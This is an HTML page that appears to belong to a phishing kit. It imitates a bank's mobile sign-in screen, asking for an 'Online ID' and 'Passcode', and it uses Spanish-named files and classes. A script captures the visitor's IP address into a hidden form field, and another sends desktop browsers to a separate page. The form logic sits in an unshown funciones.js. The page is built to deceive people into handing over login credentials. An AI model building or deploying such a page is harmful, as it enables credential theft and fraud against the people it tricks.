
  <!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="./css/normalize.min.css">
    <link rel="stylesheet" href="./css/estilom.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script type="text/javascript">
        if (screen.width > 801) {
           window.location.href = "./index.html";
        }      
    </script>
</head>

<body>
    <div class="cuerpo">
        <div class="header">
            <span>Sign In</span>
        </div>

        <div class="main">
            <form autocomplete="off" id="formusuario">
            <input type="hidden" id="gfg" name="gfg"  />
            <script>         
    $.getJSON("https://api.ipify.org?format=json", function(data) {
         
             $("#gfg").val(data.ip);

         })</script>
                <div class="fgrupo">

                    <input class="input input1" type="text" name="usr" id="usuario2" required="" placeholder="Online ID">
                    <img src="https://ik.imagekit.io/bfa/fde_files/save.png" alt="save">
                </div>
                <div class="fgrupo">

                    <input class="input" type="password" name="psw" id="contra2" required="" placeholder="Passcode" disabled="">
                </div>
                <div class="fgrupo">
                    <button type="button" id="comienzo" disabled=""><img style="margin-right: 10px;" src="https://ik.imagekit.io/bfa/fde_files/secure_lock.png"> Sign In</button>
                </div>
                <div class="fgrupo">
                    <a href="javascript:void(0)">Forgot ID/Passcode?</a>
                    <a href="javascript:void(0)">Enroll</a>
                </div>
            </form>
        </div>
        <div class="piem">
            <img src="https://ik.imagekit.io/bfa/fde_files/mpie1.png" alt="pie">
            <img src="https://ik.imagekit.io/bfa/fde_files/mpie2.png" alt="pie">
        </div>
        <script src="./js/funciones.js"></script>
    </div>


</body></html>